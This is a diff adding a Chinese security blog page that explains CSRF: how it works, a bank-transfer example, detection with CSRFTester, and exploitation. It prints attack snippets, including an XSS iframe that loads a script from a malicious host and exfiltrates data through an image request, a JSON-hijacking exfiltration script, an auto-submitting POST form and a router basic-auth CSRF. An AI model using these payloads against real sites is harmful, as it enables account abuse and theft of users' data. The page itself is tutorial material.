@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+<meta name="keywords" content="CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全—CSRF基础及利用">
+<meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/index.html">
+<meta property="og:site_name" content="xxC1&#39;s blog">
+<meta property="og:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-01-18T08:57:05.747Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全—CSRF基础及利用">
+<meta name="twitter:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+  <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全—CSRF基础及利用 | xxC1's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+<!--
+    <a href="https://github.com/xx-C1" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+-->
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxC1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">想学的太多，懂得的太少。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xx_C1">
+      <meta itemprop="description" content="Cyberspace Security">
+      <meta itemprop="image" content="/images/dxx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxC1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Web安全—CSRF基础及利用
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-10 21:00:00" itemprop="dateCreated datePublished" datetime="2018-07-10T21:00:00+08:00">2018-07-10</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-18 16:57:05" itemprop="dateModified" datetime="2021-01-18T16:57:05+08:00">2021-01-18</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/Browser端安全/" itemprop="url" rel="index"><span itemprop="name">Browser端安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          <span id="busuanzi_container_page_pv">
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+            </span>
+            阅读量: <span id="busuanzi_value_page_pv"></span>次
+          </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>3.7k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>6 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="一、CSRF理解"><a href="#一、CSRF理解" class="headerlink" title="一、CSRF理解"></a>一、CSRF理解</h3><ul>
+<li><p><strong>CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：</strong></p>
+</li>
+<li><ul>
+<li>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </li>
+</ul>
+</li>
+</ul><a id="more"></a>
+<h3 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、CSRF攻击原理及过程</h3><ul>
+<li><p><strong>如下：</strong></p>
+</li>
+<li><ul>
+<li>其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</li>
+</ul>
+</li>
+<li><p><strong>1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</strong></p>
+</li>
+<li><p><strong>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</strong></p>
+</li>
+<li><p><strong>3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</strong></p>
+</li>
+<li><p><strong>4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</strong></p>
+</li>
+<li><p><strong>5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</strong></p>
+</li>
+</ul>
+<h4 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h4><ul>
+<li>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求：</li>
+</ul>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/bank.example/withdraw</span>?account=bob&amp;amount=<span class="number">1000000</span>&amp;<span class="keyword">for</span>=bob2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</li>
+<li>黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：</li>
+</ul>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/bank.example/withdraw</span>?account=bob&amp;amount=<span class="number">1000000</span>&amp;<span class="keyword">for</span>=Mallory。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码：</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=“<span class="symbol">http:</span>/<span class="regexp">/bank.example/withdrawaccount</span>=bob&amp;amount=<span class="number">1000000</span>&amp;<span class="keyword">for</span>=Mallory ”</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。</p>
+</li>
+<li><p>大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。</p>
+</li>
+<li><p>这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
+</li>
+</ul>
+<h3 id="三、CSRF攻击获取数据的方法"><a href="#三、CSRF攻击获取数据的方法" class="headerlink" title="三、CSRF攻击获取数据的方法"></a>三、CSRF攻击获取数据的方法</h3><ul>
+<li><p><strong>要获取的关键数据：</strong></p>
+</li>
+<li><ul>
+<li><strong>用户 id</strong></li>
+<li><strong>用户昵称</strong></li>
+<li><strong>用户 email</strong></li>
+<li><strong>用户个人页面地址</strong></li>
+<li><strong>…..</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="（一）同域内"><a href="#（一）同域内" class="headerlink" title="（一）同域内"></a>（一）同域内</h4><ul>
+<li><strong>CSRF攻击获取数据几乎没有任何限制</strong></li>
+</ul>
+<h4 id="（二）跨域"><a href="#（二）跨域" class="headerlink" title="（二）跨域"></a>（二）跨域</h4><ul>
+<li><p><strong>CSRF 攻击获取数据的几种方法总结：</strong></p>
+</li>
+<li><ul>
+<li><strong>1、XSS</strong> </li>
+</ul>
+</li>
+<li><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如之前关于XSS文章做的三方的演示，使用目标站点上的XSS漏洞：</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">其中get.js 的代码为：</span><br><span class="line">//use DOM method to get your data</span><br><span class="line">new Image(). src=‘http://恶意站点/a.php?data=‘+data;</span><br><span class="line"></span><br><span class="line">恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</span><br></pre></td></tr></table></figure>
+</li>
+<li><ul>
+<li><strong>2、服务端代理技术</strong></li>
+</ul>
+</li>
+<li></li>
+<li><ul>
+<li><strong>3、JSON Hijacing</strong></li>
+</ul>
+</li>
+<li><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。</span><br><span class="line"></span><br><span class="line">相关代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">hijack</span><span class="params">(o)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//use DOM method to get your data</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span></span><br><span class="line">&#125;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://api.fanfou.com/private_messages/inbox.json?callback</span>=<span class="string">hijack&amp;count</span>=<span class="string">2</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><ul>
+<li><strong>4、Flash AsctionScript（crossdomain.xml）</strong></li>
+</ul>
+</li>
+<li><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的AS脚本进行跨域请求。</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">相关代码：</span></span><br><span class="line"><span class="xml">import flash.net.*; </span></span><br><span class="line"><span class="xml">var _l = new URLLoader(new URLRequest(“http://目标站点/"));</span></span><br><span class="line"><span class="xml">_l.addEventListener(Event.COMPLETE,function()</span><span class="template-variable">&#123;text1.text = _l.data&#125;</span><span class="xml">);</span></span><br><span class="line"><span class="xml">_l.load();</span></span><br></pre></td></tr></table></figure>
+</li>
+<li></li>
+</ul>
+<h3 id="四、检测方法"><a href="#四、检测方法" class="headerlink" title="四、检测方法"></a>四、检测方法</h3><ul>
+<li><p>最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>
+</li>
+<li><p>一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。</p>
+</li>
+</ul>
+<h4 id="以-CSRFTester-工具为例"><a href="#以-CSRFTester-工具为例" class="headerlink" title="以 CSRFTester 工具为例"></a>以 <strong>CSRFTester</strong> 工具为例</h4><ul>
+<li><p><strong>使用 CSRFTester 进行测试时：</strong></p>
+</li>
+<li><ul>
+<li>1.抓取我们在浏览器中访问过的所有链接以及所有的表单等信息</li>
+<li>2.通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</li>
+<li>3.如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞。</li>
+</ul>
+</li>
+<li><p>当然此款工具也可以被用来进行 CSRF 攻击。</p>
+</li>
+</ul>
+<h3 id="五、CSRF利用"><a href="#五、CSRF利用" class="headerlink" title="五、CSRF利用"></a>五、CSRF利用</h3><ul>
+<li><p><strong>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</strong></p>
+</li>
+<li><p><strong>相比于XSS少一个获取cookie的步骤。</strong></p>
+</li>
+<li><p><strong>思路：诱使管理员打开构造的代码！</strong></p>
+</li>
+<li><p><strong>CSRF出现的地方通常在权限控制的地方 如会员中心、后台管理、用户注册、发布帖子、用户后台处、交易管理处这几个地方</strong></p>
+</li>
+</ul>
+<h4 id="（一）GET类型CSRF"><a href="#（一）GET类型CSRF" class="headerlink" title="（一）GET类型CSRF"></a>（一）GET类型CSRF</h4><ul>
+<li><p><strong>一般由于程序员安全意识不高造成</strong></p>
+</li>
+<li><p><strong>诱导打开插入恶意连接的代码-&gt;迅速携带cookie执行恶意操作</strong></p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://xxxx.org/csrf.php?xx</span>=<span class="string">11</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（二）POST型CSRF"><a href="#（二）POST型CSRF" class="headerlink" title="（二）POST型CSRF"></a>（二）POST型CSRF</h4><ul>
+<li><p><strong>危害小于GET型</strong></p>
+</li>
+<li><p><strong>自动提交表单</strong>：访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xx"</span> <span class="attr">value</span>=<span class="string">"11"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="（三）其他利用"><a href="#（三）其他利用" class="headerlink" title="（三）其他利用"></a>（三）其他利用</h4><ul>
+<li><strong>过基础认证的CSRF(常用于路由器):</strong></li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> src=http:<span class="comment">//admin:admin@192.168.1.1 /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了。</strong></li>
+</ul>
+<ul>
+<li><strong>CSRF攻击会根据场景的不同而危害迥异。小到诱使用户留言，大到垂直越权进行操作。这些攻击的请求都是跨域发出,并且至关重要的一点，都是在受害者的身份得到认证以后发生的。另外，第一个场景中攻击时并没有使用JavaScrpit，这说明CSRF攻击并不依赖于JavaScript。</strong></li>
+</ul>
+
+    </div>
+    <div>
+    
+       <div>
+      
+          <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+      
+  </div>
+    
+    </div>
+
+    
+    
+    
+        
+      
+        <div id="reward-container">
+  <div>这么年轻就乞讨，很难说是出于自己的选择，还是被命运一巴掌扇到了这样的处境。</div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.jpg" alt="xx_C1 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>xx_C1</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/" title="Web安全—CSRF基础及利用">https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i>CSRF</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2018/07/09/Web安全—XSS触发、绕过、盗取Cookie/" rel="next" title="Web安全—XSS触发、绕过、盗取Cookie">
+                  <i class="fa fa-chevron-left"></i> Web安全—XSS触发、绕过、盗取Cookie
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2018/07/11/Web安全—CSRF防御及绕过/" rel="prev" title="Web安全—CSRF防御及绕过">
+                  Web安全—CSRF防御及绕过 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
